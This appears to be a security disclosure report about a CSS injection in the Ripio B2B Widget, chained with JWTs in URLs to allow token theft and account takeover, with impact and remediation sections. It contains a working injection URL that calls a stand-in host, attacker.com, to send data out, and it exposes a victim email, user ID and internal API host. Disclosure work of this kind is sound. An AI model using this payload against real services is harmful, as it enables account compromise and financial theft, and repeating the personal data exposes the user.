# CRITICAL: CSS Injection → JWT Token Theft → Full Account Compromise

## Summary

A CSS Injection vulnerability in the Ripio B2B Widget combined with JWT tokens being passed in URL parameters allows attackers to steal authentication tokens and gain **full access to victim's financial account**.

## Severity: CRITICAL (CVSS 9.8)

- **Attack Vector**: Network
- **Attack Complexity**: Low
- **Privileges Required**: None
- **User Interaction**: Required (click malicious link)
- **Impact**: Complete account compromise including financial operations

## Vulnerability Chain

### Step 1: CSS Injection in B2B Widget

**URL**: `https://d2pneqdaei3b3x.cloudfront.net/index.html`
**Vulnerable Parameters**: `_fn`, `_fo`, `_fd`

The widget directly interpolates user input into CSS without sanitization:

```javascript
const customFontsText = `body { font-family: '${fontName}', ${fontDefault};}`;
```

### Step 2: JWT Token in URL

B2B Widget passes authentication token via URL parameter `_to`:

```
https://d2pneqdaei3b3x.cloudfront.net/index.html?_to=JWT_TOKEN
```

### Step 3: Combined Attack - Token Theft

Attacker creates malicious URL that:

1. Contains victim's JWT token (or tricks victim to use their token)
2. Injects CSS that exfiltrates data to attacker's server

```
https://d2pneqdaei3b3x.cloudfront.net/index.html?_to=VICTIM_JWT&_fn=x';}*{background:url('https://attacker.com/steal')}/*&_fo=y
```

The token leaks via:

- HTTP Referer header to any external link
- CSS url() requests to attacker-controlled server
- Browser history and server logs

## Proof of Concept

### Visual Proof (CSS Injection Works):

```
https://d2pneqdaei3b3x.cloudfront.net/index.html?_fn=x%27%3B%7D*%7Bbackground%3Ared%20!important%7D/*&_fo=y
```

### Token Theft Proof:

With stolen JWT token, attacker gains access to:

#### 1. Full User Identity

```json
{
  "email": "shailyn53@doncong.com",
  "user_uuid": "691e2136-48bb-4e55-9318-a594ac9c3cec",
  "country": "AR",
  "is_two_factor_enabled": false
}
```

#### 2. KYC/PII Data (CRITICAL PRIVACY BREACH)

```json
{
  "id": 3418360,
  "email": "shailyn53@doncong.com",
  "external_id": "691e2136-48bb-4e55-9318-a594ac9c3cec",
  "callback_url": "https://api.prd.awsorg.ripiocorp.io/...",
  "process": {
    "token": "eyJhbGciOiJIUzI1NiIs...",
    "status": "WTG"
  }
}
```

#### 3. Financial Operations Access

```
WITHDRAWAL LIMITS:
- bank-transfer-cvu: Up to 900,000,000 ARS daily
- rapipagoonline: Up to 900,000,000 ARS daily
- crypto: Available
- defi: Available

BUY LIMITS:
- payment-card: Up to 15,000,000 ARS daily

SWAP LIMITS:
- Up to 5,000 ARS daily
```

## Impact

1. **Complete Account Takeover**: Attacker has full API access as the victim
2. **Financial Theft**: Can potentially initiate withdrawals up to 900M ARS/day
3. **PII Exposure**: Full KYC data including internal callback URLs
4. **Internal Infrastructure Exposed**: `api.prd.awsorg.ripiocorp.io` leaked
5. **No 2FA Protection**: Token works without 2FA verification

## Attack Scenario

1. Attacker sends phishing link to B2B Widget partner employee
2. Employee clicks link, their browser loads widget with malicious CSS
3. CSS exfiltrates JWT token to attacker's server
4. Attacker uses stolen token to:
   - Access victim's account data
   - View all transactions
   - Potentially initiate withdrawals
   - Access KYC documents

## Remediation

1. **IMMEDIATE**: Remove JWT token from URL parameters - use secure cookies or Authorization header
2. **IMMEDIATE**: Sanitize all font parameters (\_fn, \_fo, \_fd) - whitelist alphanumeric characters only
3. **HIGH**: Implement Content-Security-Policy to prevent CSS injection
4. **HIGH**: Add token binding to prevent cross-device token reuse
5. **MEDIUM**: Require 2FA for sensitive operations even with valid token

## References

- CWE-79: Improper Neutralization of Input During Web Page Generation
- CWE-200: Exposure of Sensitive Information
- CWE-522: Insufficiently Protected Credentials
- OWASP: Sensitive Data in URL

## Timeline

- **Discovery**: 2025-12-01
- **Vendor Notified**: [PENDING]
